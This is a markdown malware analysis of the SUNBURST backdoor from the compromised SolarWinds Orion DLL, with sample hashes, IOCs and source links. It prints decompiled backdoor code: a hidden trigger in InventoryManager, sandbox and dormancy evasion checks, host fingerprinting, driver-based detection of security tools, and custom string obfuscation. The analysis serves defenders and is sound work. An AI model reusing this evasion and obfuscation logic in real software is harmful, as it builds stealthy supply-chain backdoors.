# 1. Sunburst Analysis

- [1. Sunburst Analysis](#1-sunburst-analysis)
  - [1.1. Sample HASH](#11-sample-hash)
- [2. Analysis](#2-analysis)
  - [2.1. Entry Point](#21-entry-point)
  - [2.2. Backdoor Class](#22-backdoor-class)
    - [2.2.1. Constructor](#221-constructor)
    - [2.2.2. Initialize](#222-initialize)
      - [2.2.2.1. Check process name](#2221-check-process-name)
      - [2.2.2.2. Check LastWriteTime](#2222-check-lastwritetime)
      - [2.2.2.3. Create NamedPipeServerStream](#2223-create-namedpipeserverstream)
      - [2.2.2.4. ReadReportStatus](#2224-readreportstatus)
      - [2.2.2.5. Delay](#2225-delay)
      - [2.2.2.6. Get DomainName](#2226-get-domainname)
      - [2.2.2.7. Delay](#2227-delay)
      - [2.2.2.8. GetOrCreateUserID](#2228-getorcreateuserid)
      - [2.2.2.9. Delay](#2229-delay)
      - [2.2.2.10. ReadServiceStatus](#22210-readservicestatus)
      - [2.2.2.11. Update](#22211-update)
      - [2.2.2.12. Close](#22212-close)
    - [2.2.3. OrionImprovementBusinessLayer.Update](#223-orionimprovementbusinesslayerupdate)
    - [2.2.4. Information grab](#224-information-grab)
      - [2.2.4.1. GetOSVersion](#2241-getosversion)
      - [2.2.4.2. GetOrCreateUserID](#2242-getorcreateuserid)
      - [2.2.4.3. GetNetworkAdapterConfiguration](#2243-getnetworkadapterconfiguration)
    - [2.2.5. ProcessTracker.SearchConfigurations](#225-processtrackersearchconfigurations)
  - [2.3. Encryption/obfuscation](#23-encryptionobfuscation)
    - [2.3.1. Decoded String (Unzip)](#231-decoded-string-unzip)
    - [2.3.2. Custom Base64Decode](#232-custom-base64decode)
    - [2.3.3. Hash FNV-1a-XOR](#233-hash-fnv-1a-xor)
- [3. IOC](#3-ioc)
- [4. Source](#4-source)


## 1.1. Sample HASH

    SHA256  32519B85C0B422E4656DE6E6C41878E95FD95026267DAAB4215EE59C107D6C77 
    SHA1    76640508B1E7759E548771A5359EAED353BF1EEC 
    MD5     B91CE2FA41029F6955BFF20079468448

# 2. Analysis

## 2.1. Entry Point


Class: `SolarWinds.Orion.Core.BusinessLayer.InventoryManager`

```C#
internal void RefreshInternal()
{
    if (InventoryManager.log.get_IsDebugEnabled())
    InventoryManager.log.DebugFormat("Running scheduled background backgroundInventory check on engine {0}", (object) this.engineID);
    try
    {
    if (!OrionImprovementBusinessLayer.IsAlive)
        new Thread(new ThreadStart(OrionImprovementBusinessLayer.Initialize))
        {
        IsBackground = true
        }.Start();
    }
    catch (Exception ex)
    {
    }
    if (this.backgroundInventory.IsRunning)
    {
    InventoryManager.log.Info((object) "Skipping background backgroundInventory check, still running");
    }
    else
    {
    this.QueueInventoryTasksFromNodeSettings();
    this.QueueInventoryTasksFromInventorySettings();
    if (this.backgroundInventory.QueueSize <= 0)
        return;
    this.backgroundInventory.Start();
    }
}
```
## 2.2. Backdoor Class

Class: `SolarWinds.Orion.Core.BusinessLayer.OrionImprovementBusinessLayer`
### 2.2.1. Constructor

The constructor will set variable (Hash and encode strings).

### 2.2.2. Initialize

Full code:

```C#
if (OrionImprovementBusinessLayer.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) != 17291806236368054941UL || DateTime.Now.CompareTo(System.IO.File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location).AddHours((double) new Random().Next(288, 336))) < 0)
    return;
OrionImprovementBusinessLayer.instance = new NamedPipeServerStream(OrionImprovementBusinessLayer.appId);
OrionImprovementBusinessLayer.ConfigManager.ReadReportStatus(out OrionImprovementBusinessLayer.status);
if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Truncate)
    return;
OrionImprovementBusinessLayer.DelayMin(0, 0);
OrionImprovementBusinessLayer.domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;
if (string.IsNullOrEmpty(OrionImprovementBusinessLayer.domain4) || OrionImprovementBusinessLayer.IsNullOrInvalidName(OrionImprovementBusinessLayer.domain4))
    return;
OrionImprovementBusinessLayer.DelayMin(0, 0);
if (!OrionImprovementBusinessLayer.GetOrCreateUserID(out OrionImprovementBusinessLayer.userId))
    return;
OrionImprovementBusinessLayer.DelayMin(0, 0);
OrionImprovementBusinessLayer.ConfigManager.ReadServiceStatus(false);
OrionImprovementBusinessLayer.Update();
OrionImprovementBusinessLayer.instance.Close();
```

#### 2.2.2.1. Check process name

Exit if the process name is not `solarwinds.businesslayerhost`


Source code:
```c# 
OrionImprovementBusinessLayer.GetHash(Process.GetCurrentProcess().ProcessName.ToLower()) != 17291806236368054941UL
```

#### 2.2.2.2. Check LastWriteTime

if `LastWriteTime < (Between 12-14 days)` the thread will exit.

Source code:
```c# 
DateTime.Now.CompareTo(System.IO.File.GetLastWriteTime(Assembly.GetExecutingAssembly().Location).AddHours((double) new Random().Next(288, 336))) < 0)
```

#### 2.2.2.3. Create NamedPipeServerStream

OrionImprovementBusinessLayer.appId = `583da945-62af-10e8-4902-a8f205c72b2e`

Source code:
```C#
OrionImprovementBusinessLayer.instance = new NamedPipeServerStream(OrionImprovementBusinessLayer.appId);
```
    
#### 2.2.2.4. ReadReportStatus

Check if `ConfigurationManager.AppSettings["ReportWatcherRetry"]` return 3 and if it's the case the thread will exit.

Source code :
```C#
int.TryParse((ConfigurationManager.AppSettings["ReportWatcherRetry"], out result)
switch (result)
{
case 3:
    status = OrionImprovementBusinessLayer.ReportStatus.Truncate;
    return true;
case 4:
    status = OrionImprovementBusinessLayer.ReportStatus.New;
    return true;
case 5:
    status = OrionImprovementBusinessLayer.ReportStatus.Append;
    return true;
}
if (OrionImprovementBusinessLayer.status == OrionImprovementBusinessLayer.ReportStatus.Truncate)
return;
```

#### 2.2.2.5. Delay

The delay time is between 30 minutes and 2 hours.

```C#
double minMs =30 * 60.0 * 1000.0;
double maxMs =120 * 60.0 * 1000.0;
double num;
for (num = minMs + new Random().NextDouble() * (90 * 60.0 * 1000.0); num >= (double) int.MaxValue; num -= (double) int.MaxValue)
    Thread.Sleep(int.MaxValue);
Thread.Sleep((int) num);
```

#### 2.2.2.6. Get DomainName

Get system DomainName. If empty or null, then the thread will exit.

```C#
OrionImprovementBusinessLayer.domain4 = IPGlobalProperties.GetIPGlobalProperties().DomainName;
if (string.IsNullOrEmpty(OrionImprovementBusinessLayer.domain4) || OrionImprovementBusinessLayer.IsNullOrInvalidName(OrionImprovementBusinessLayer.domain4))
    return;
```

#### 2.2.2.7. Delay

The delay time is between 30 minutes and 2 hours.

#### 2.2.2.8. GetOrCreateUserID

The UserID is create based the concatenation of:
- PhysicalAddress of the first Network Interface (Not Loopback)
    ```c#
    return ((IEnumerable<NetworkInterface>) NetworkInterface.GetAllNetworkInterfaces()).Where<NetworkInterface>((Func<NetworkInterface, bool>) (nic => nic.OperationalStatus == OperationalStatus.Up && nic.NetworkInterfaceType != NetworkInterfaceType.Loopback)).Select<NetworkInterface, string>((Func<NetworkInterface, string>) (nic => nic.GetPhysicalAddress().ToString())).FirstOrDefault<string>();
    ```
- Domain Name
- System MachineGuid
    ```c#
    str += OrionImprovementBusinessLayer.RegistryHelper.GetValue("HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Cryptography"), OrionImprovementBusinessLayer.ZipHelper.Unzip("MachineGuid"), (object) "");
    ```
The concatenat string is then hash with md5 and the hashed whit this function:
```C#
for (int index = 0; index < hash.Length; ++index)
          hash64[index % hash64.Length] ^= hash[index];
```
#### 2.2.2.9. Delay

The delay time is between 30 minutes and 2 hours.
#### 2.2.2.10. ReadServiceStatus

```C#
if (OrionImprovementBusinessLayer.ConfigManager.ReadConfig("ReportWatcherPostpone", out sValue))
{
int result;
if (int.TryParse(sValue, out result))
{
    if (result >= 250)
    {
    if (result % 5 == 0)
    {
        if (result <= 250 + ((1 << OrionImprovementBusinessLayer.svcList.Length) - 1) * 5)
        {
        int num = (result - 250) / 5;
        if (!_readonly)
        {
            for (int index = 0; index < OrionImprovementBusinessLayer.svcList.Length; ++index)
            OrionImprovementBusinessLayer.svcList[index].stopped = (uint) (num & 1 << index) > 0U;
        }
        return true;
        }
    }
    }
}
```

#### 2.2.2.11. Update

The real game see point: [2.2.2.11. OrionImprovementBusinessLayer.Update](#22211-update)

#### 2.2.2.12. Close

    OrionImprovementBusinessLayer.instance.Close();

### 2.2.3. OrionImprovementBusinessLayer.Update

[TODO]

### 2.2.4. Information grab 
#### 2.2.4.1. GetOSVersion

Select * From Win32_OperatingSystem

    Caption

    OSArchitecture
    InstallDate
    Organization
    RegisteredUser
    Version

#### 2.2.4.2. GetOrCreateUserID

    MachineGuid = reg query HKLM\SOFTWARE\Microsoft\Cryptography /v MachineGuid
    hash = md5(MachineGuid)
    for (int index = 0; index < hash.Length; ++index)
          hash64[index % hash64.Length] ^= hash[index];

#### 2.2.4.3. GetNetworkAdapterConfiguration

Select * From Win32_NetworkAdapterConfiguration where IPEnabled=true

    Description
    MACAddress
    DHCPEnabled
    DHCPServer
    DNSHostName
    DNSDomainSuffixSearchOrder
    DNSServerSearchOrder
    IPAddress
    IPSubnet
    DefaultIPGateway
### 2.2.5. ProcessTracker.SearchConfigurations

```C#
private static readonly ulong[] configTimeStamps = new ulong[17]{
    17097380490166623672UL,
    15194901817027173566UL,
    12718416789200275332UL,
    18392881921099771407UL,
    3626142665768487764UL,
    12343334044036541897UL,
    397780960855462669UL,
    6943102301517884811UL,
    13544031715334011032UL,
    11801746708619571308UL,
    18159703063075866524UL,
    835151375515278827UL,
    16570804352575357627UL,
    1614465773938842903UL,
    12679195163651834776UL,
    2717025511528702475UL,
    17984632978012874803UL
};


using (ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("Select * From Win32_SystemDriver"))
{
    foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
    {
    ulong hash = OrionImprovementBusinessLayer.GetHash(Path.GetFileName(managementBaseObject.Properties["PathName"].Value.ToString()).ToLower());
    if (Array.IndexOf<ulong>(OrionImprovementBusinessLayer.configTimeStamps, hash) != -1)
        return true;
    }
}
return false;
```

    Get-CimInstance -ClassName Win32_SystemDriver | Select-Object -Property PathName > stringFile.txt

## 2.3. Encryption/obfuscation
### 2.3.1. Decoded String (Unzip)

1. FromBase64String
2. Decompress
3. Encoding.UTF8.GetString

```C#
public static string Unzip(string input)
{
if (string.IsNullOrEmpty(input))
    return input;
try
{
    return Encoding.UTF8.GetString(OrionImprovementBusinessLayer.ZipHelper.Decompress(Convert.FromBase64String(input)));
}
catch (Exception ex)
{
    return input;
}
}
```

> Decode String with cyberchef

    https://gchq.github.io/CyberChef/#recipe=From_Base64('A-Za-z0-9%2B/%3D',true)Raw_Inflate(0,0,'Adaptive',false,false)&input=OC9CMmpZeDM5bkVNRG5ZTmpnL3k5dzhCQUE9PQ

### 2.3.2. Custom Base64Decode

https://gchq.github.io/CyberChef/#recipe=From_Base64('rq3gsalt6u1iyfzop572d49bnx8cvmkewhj',true)&input=S3lvMFRpOU96Q2t4S3pYTXJFeXJ5aTh3TlRkS01iRk15cXV3U0M3THpVNHR6OGdDQUE9PQ

Alphabet used Base64Decode: `rq3gsalt6u1iyfzop572d49bnx8cvmkewhj`
Alphabet used Base64Encode: `ph2eifo3n5utg1j8d94qrvbmk0sal76c`

### 2.3.3. Hash FNV-1a-XOR

```C#
private static ulong GetHash(string s){
    ulong num1 = 14695981039346656037;
    try{
        foreach (byte num2 in Encoding.UTF8.GetBytes(s)){
            num1 ^= (ulong) num2;
            num1 *= 1099511628211UL;
        }
    }catch{}
    return num1 ^ 6605813339339102567UL;
}
```

The majority of the hash have been cracked and can be found here: 

[https://docs.google.com/spreadsheets/d/1u0_Df5OMsdzZcTkBDiaAtObbIOkMa5xbeXdKk_k0vWs/edit#gid=0](https://docs.google.com/spreadsheets/d/1u0_Df5OMsdzZcTkBDiaAtObbIOkMa5xbeXdKk_k0vWs/edit#gid=0)

# 3. IOC 

NamedPipeServerStream id: `583da945-62af-10e8-4902-a8f205c72b2e`

Dll hash:
- SHA256:  `32519B85C0B422E4656DE6E6C41878E95FD95026267DAAB4215EE59C107D6C77` 
- SHA1:    `76640508B1E7759E548771A5359EAED353BF1EEC` 
- MD5:     `B91CE2FA41029F6955BFF20079468448`
# 4. Source 
> DOC 

    https://www.microsoft.com/security/blog/2020/12/18/analyzing-solorigate-the-compromised-dll-file-that-started-a-sophisticated-cyberattack-and-how-microsoft-defender-helps-protect/
    https://www.fireeye.com/blog/threat-research/2020/12/evasive-attacker-leverages-solarwinds-supply-chain-compromises-with-sunburst-backdoor.html

> Malware info

    https://github.com/fireeye/sunburst_countermeasures/blob/main/indicator_release/Indicator_Release_Hashes.csv
    https://www.virustotal.com/gui/file/32519b85c0b422e4656de6e6c41878e95fd95026267daab4215ee59c107d6c77/community
    https://app.any.run/tasks/533e5fc5-c5ee-47d7-9eca-342f24d7945f/
